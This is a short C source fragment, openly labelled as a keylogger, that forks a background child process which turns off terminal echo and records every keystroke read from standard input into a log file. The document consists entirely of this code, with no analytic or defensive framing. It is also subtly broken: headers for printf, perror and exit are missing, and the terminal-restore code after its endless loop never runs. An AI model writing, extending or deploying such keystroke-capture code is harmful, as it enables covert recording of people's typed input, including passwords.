#include <termios.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>

void keylogger_operations(char *logfile) {
    pid_t pid = fork();
    if (pid == 0) { // Child process (keylogger)
        int log_fd = open(logfile, O_CREAT | O_WRONLY | O_APPEND, 0644);
        if (log_fd == -1) {
            perror("Error opening log file");
            exit(1);
        }

        // Write timestamp to log file
        time_t t = time(NULL);
        dprintf(log_fd, "Session started: %s\n", ctime(&t));

        // Disable terminal echoing
        struct termios oldt, newt;
        tcgetattr(STDIN_FILENO, &oldt);
        newt = oldt;
        newt.c_lflag &= ~(ECHO | ICANON); // Disable echo and canonical mode
        tcsetattr(STDIN_FILENO, TCSANOW, &newt);

        char ch;
        while (1) {
            read(STDIN_FILENO, &ch, 1); // Capture keystrokes
            if (ch == '\n') write(log_fd, "\n", 1);
            else write(log_fd, &ch, 1);
        }

        // Restore terminal settings
        tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
        close(log_fd);
        exit(0);
    } else {
        printf("Keylogger is running in the background.\n");
    }
}
